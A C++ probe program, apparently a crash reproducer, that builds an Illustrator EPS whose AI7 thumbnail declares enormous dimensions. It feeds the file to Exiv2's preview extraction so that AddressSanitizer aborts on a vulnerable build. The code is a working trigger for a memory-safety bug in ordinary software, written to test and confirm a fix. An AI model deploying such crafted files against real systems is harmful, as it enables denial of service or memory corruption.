// Probe: drives Exiv2's public API with an in-contract EPS file carrying an
// AI7 native preview, forcing extraction of the preview through
// PreviewManager. Aborts under AddressSanitizer only on the defective tree.
//
// Build (C++ toolchain; Exiv2's public headers are C++):
//   g++ -fsanitize=address -g probe.c -I<prefix>/include -L<prefix>/lib -lexiv2

#include <exiv2/error.hpp>
#include <exiv2/image.hpp>
#include <exiv2/preview.hpp>

#include <cstdio>
#include <string>

namespace {

// Append `count` copies of the two-hex-digit encoding of `value`.
void appendHexRun(std::string& out, unsigned value, unsigned count) {
  static const char* digits = "0123456789ABCDEF";
  for (unsigned i = 0; i < count; i++) {
    out += digits[(value >> 4) & 0xF];
    out += digits[value & 0xF];
  }
}

// Minimal Illustrator EPS with an %AI7_Thumbnail native preview whose
// declared dimensions are enormous. The hex payload decodes to a 768-byte
// color table followed by RLE image data.
std::string makeEps() {
  std::string hexData;
  // 256-entry RGB color table (all zero).
  appendHexRun(hexData, 0x00, 768);
  // RLE image data: magic "RLE", then a 0xFD-escape run: 255 x color 0.
  appendHexRun(hexData, 'R', 1);
  appendHexRun(hexData, 'L', 1);
  appendHexRun(hexData, 'E', 1);
  appendHexRun(hexData, 0xFD, 1);
  appendHexRun(hexData, 0xFF, 1);
  appendHexRun(hexData, 0x00, 1);

  std::string eps = "%!PS-Adobe-3.0 EPSF-3.0\n";
  eps += "%%BoundingBox: 0 0 100 100\n";
  eps += "%AI7_Thumbnail: 6148914691236517206 1 8\n";
  eps += "%%BeginData: " + std::to_string(hexData.size()) + " Hex Bytes\n";
  // Illustrator writes the hex payload as '%'-prefixed comment lines.
  for (size_t i = 0; i < hexData.size(); i += 72) {
    eps += '%';
    eps += hexData.substr(i, 72);
    eps += '\n';
  }
  eps += "%%EndData\n";
  eps += "%%EndComments\n";
  eps += "showpage\n";
  eps += "%%EOF\n";
  return eps;
}

}  // namespace

// Ask the ASan runtime to abort (SIGABRT) when it reports an error, so the
// process exit status reflects the fault even if ASAN_OPTIONS is unset.
extern "C" const char* __asan_default_options() {
  return "abort_on_error=1";
}

int main(void) {
  const std::string eps = makeEps();
  try {
    auto image = Exiv2::ImageFactory::open(reinterpret_cast<const Exiv2::byte*>(eps.data()), eps.size());
    image->readMetadata();

    Exiv2::PreviewManager manager(*image);
    const Exiv2::PreviewPropertiesList properties = manager.getPreviewProperties();
    for (const auto& prop : properties) {
      const Exiv2::PreviewImage preview = manager.getPreviewImage(prop);
      std::printf("preview %u: %ux%u size=%lu\n", prop.id_, prop.width_, prop.height_,
                  static_cast<unsigned long>(preview.size()));
    }
  } catch (const Exiv2::Error& e) {
    std::printf("exiv2 error: %s\n", e.what());
    return 0;
  } catch (const std::exception& e) {
    std::printf("error: %s\n", e.what());
    return 0;
  }
  return 0;
}
